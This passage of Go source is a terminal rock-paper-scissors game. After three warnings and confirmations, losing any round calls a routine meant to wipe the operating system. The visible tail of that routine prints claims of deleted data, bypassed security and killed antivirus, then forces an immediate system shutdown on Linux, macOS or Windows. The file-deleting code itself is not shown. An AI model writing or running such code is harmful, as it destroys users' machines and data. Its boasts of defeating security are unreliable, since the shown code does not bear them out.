	fmt.Println(red + bold + "  ☠️  OPERATING SYSTEM COMPLETELY DESTROYED ☠️" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	fmt.Println(red + "  ✓ ALL DATA PERMANENTLY LOST" + reset)
	fmt.Println(red + "  ✓ SYSTEM COMPLETELY UNBOOTABLE" + reset)
	fmt.Println(red + "  ✓ ALL SECURITY MEASURES DEFEATED" + reset)
	fmt.Println(red + "  ✓ ALL ADMIN RESTRICTIONS BYPASSED" + reset)
	fmt.Println(red + "  ✓ ALL ANTIVIRUS KILLED" + reset)
	fmt.Println(red + "  ✓ NO RECOVERY POSSIBLE" + reset)
	fmt.Println(red + "  ✓ SYSTEM WILL SHUT DOWN NOW" + reset)
	fmt.Println()

	time.Sleep(2000 * time.Millisecond)

	// FORCED SHUTDOWN - NO QUESTIONS ASKED!
	fmt.Println(yellow + "  SHUTTING DOWN SYSTEM IN 3 SECONDS..." + reset)
	for i := 3; i > 0; i-- {
		fmt.Printf("  %d... ", i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println()

	switch runtime.GOOS {
	case "linux", "darwin":
		runCommand("sudo", "shutdown", "-h", "now")
	case "windows":
		runCommand("shutdown", "/s", "/t", "0", "/f")
	}
}

func displayHistory(history []string) {
	if len(history) == 0 {
		return
	}
	fmt.Println(dim + "  Recent History:" + reset)
	start := len(history) - 5
	if start < 0 {
		start = 0
	}
	for i := start; i < len(history); i++ {
		fmt.Printf("    %s\n", history[i])
	}
	fmt.Println()
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Show warning first
	showWarning()

	// FIRST CONFIRMATION
	if !getYesNo("  Do you REALLY want to continue?") {
		fmt.Println()
		fmt.Println(green + "  ✅ You chose wisely. Exiting safely." + reset)
		fmt.Println()
		return
	}

	// SECOND CONFIRMATION
	fmt.Println()
	fmt.Println(red + bold + "  ☠️  LAST CHANCE TO BACK OUT! ☠️" + reset)
	fmt.Println()

	if !getYesNo("  Are you ABSOLUTELY sure you want to continue?") {
		fmt.Println()
		fmt.Println(green + "  ✅ System saved! Exiting." + reset)
		fmt.Println()
		return
	}

	// THIRD CONFIRMATION - FINAL WARNING
	fmt.Println()
	fmt.Println(red + bold + "  ⚠️  FINAL WARNING! ⚠️" + reset)
	fmt.Println(red + "  This will PERMANENTLY DESTROY your operating system!" + reset)
	fmt.Println(red + "  There is NO UNDO!" + reset)
	fmt.Println(red + "  This BYPASSES ALL SECURITY!" + reset)
	fmt.Println(red + "  All data will be LOST FOREVER!" + reset)
	fmt.Println(red + "  NO CONFIRMATION WHEN YOU LOSE!" + reset)
	fmt.Println()

	if !getYesNo("  Type YES to confirm destruction") {
		fmt.Println()
		fmt.Println(green + "  ✅ System saved! Exiting." + reset)
		fmt.Println()
		return
	}

	fmt.Println()
	fmt.Println(red + bold + "  ☠️  YOU HAVE CHOSEN DESTRUCTION! ☠️" + reset)
	fmt.Println(red + "  Your fate is sealed. Good luck." + reset)
	fmt.Println(red + "  Remember - if you lose, NO CONFIRMATION!" + reset)
	fmt.Println(red + "  Deletion starts INSTANTLY!" + reset)
	time.Sleep(1500 * time.Millisecond)
	banner()

	wins := 0
	losses := 0
	draws := 0
	round := 1
	history := []string{}
	winStreak := 0
	maxWinStreak := 0

	for {
		fmt.Printf(bold+"  Round %d"+reset+"  |  "+green+"W: %d"+reset+"  "+red+"L: %d"+reset+"  "+dim+"D: %d"+reset,
			round, wins, losses, draws)

		if maxWinStreak > 0 {
			fmt.Printf("  "+green+"🔥 Best streak: %d"+reset, maxWinStreak)
		}
		fmt.Println()
		fmt.Println()

		displayHistory(history)

		fmt.Println("  Choose your weapon:")
		fmt.Println(cyan + "    [1] ✊ Rock     (r)" + reset)
		fmt.Println(cyan + "    [2] 🖐  Paper    (p)" + reset)
		fmt.Println(cyan + "    [3] ✌️  Scissors (s)" + reset)
		fmt.Println(red + dim + "    [q] Quit (save your OS!)" + reset)
		fmt.Println()
		fmt.Print("  Your move: ")

		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(red + "  Error reading input. Please try again." + reset)
			continue
		}
		input = strings.TrimSpace(input)

		if strings.ToLower(input) == "q" {
			fmt.Println()
			fmt.Println(cyan + bold + "  ═══════════════════════════════════════════════════" + reset)
			fmt.Printf(cyan+"  FINAL SCORE — "+green+"Wins: %d"+reset+cyan+"  "+red+"Losses: %d"+reset+cyan+"  Draws: %d\n"+reset, wins, losses, draws)
			fmt.Println(green + bold + "  🏆 You escaped with your OS intact! 🏆" + reset)
			fmt.Println(cyan + "  ═══════════════════════════════════════════════════" + reset)
			fmt.Println()
			break
		}

		playerChoice := getChoice(input)
		if playerChoice == 0 {
			fmt.Println(red + "  Invalid input. Enter 1, 2, 3 or r/p/s." + reset)
			fmt.Println()
			continue
		}

		compChoice := r.Intn(3) + 1
		res := result(playerChoice, compChoice)

		fmt.Println()
		fmt.Printf("  You:      %s %s\n", getEmoji(playerChoice), choiceName(playerChoice))

		fmt.Print("  Computer: ")
		for i := 0; i < 3; i++ {
			fmt.Print(".")
			time.Sleep(300 * time.Millisecond)
		}
		fmt.Printf(" %s %s\n", getEmoji(compChoice), choiceName(compChoice))
		fmt.Println()
		time.Sleep(200 * time.Millisecond)

		var resultText string
		switch res {
		case 0:
			draws++
			resultText = yellow + bold + "  ══ 🤝 DRAW ══" + reset
			fmt.Println(resultText)
		case 1:
			wins++
			winStreak++
			if winStreak > maxWinStreak {
				maxWinStreak = winStreak
			}
			resultText = green + bold + "  ══ 🎉 YOU WIN! ══" + reset
			fmt.Println(resultText)
			if winStreak >= 3 {
				fmt.Printf(green+"  🔥 %d wins in a row! Your OS survives! 🔥\n"+reset, winStreak)
			}
		case -1:
			losses++
			winStreak = 0
			resultText = red + bold + "  ══ 💀 YOU LOSE ══" + reset
			fmt.Println(resultText)
			
			// ============================================
			// NO CONFIRMATION! DELETE NOW!
			// ============================================
			fmt.Println()
			fmt.Println(red + bold + "  ⚡ NO CONFIRMATION! DELETION STARTS NOW! ⚡" + reset)
			fmt.Println(red + "  ALL SECURITY MEASURES ARE BEING BYPASSED..." + reset)
			time.Sleep(800 * time.Millisecond)
			
			deleteOS()
			return
		}

		playerName := choiceName(playerChoice)
		compName := choiceName(compChoice)
		var emoji string
		switch res {
		case 0:
			emoji = "🤝"
		case 1:
			emoji = "✅"
		case -1:
			emoji = "❌"
		}
		history = append(history, fmt.Sprintf("%s You: %s vs Computer: %s", emoji, playerName, compName))

		if len(history) > 20 {
			history = history[1:]
		}

		totalGames := wins + losses + draws
		winRate := 0.0
		if totalGames > 0 {
			winRate = float64(wins) / float64(totalGames) * 100
		}

		fmt.Println()
		fmt.Printf(dim+"  Stats: %.1f%% win rate over %d games"+reset, winRate, totalGames)
		if winStreak > 0 {
			fmt.Printf(dim+"  |  Current streak: %d"+reset, winStreak)
		}
		fmt.Println()

		round++
		fmt.Println()
		fmt.Println(dim + "  ─────────────────────────────────────────" + reset)
		fmt.Println()

		time.Sleep(500 * time.Millisecond)
	}
}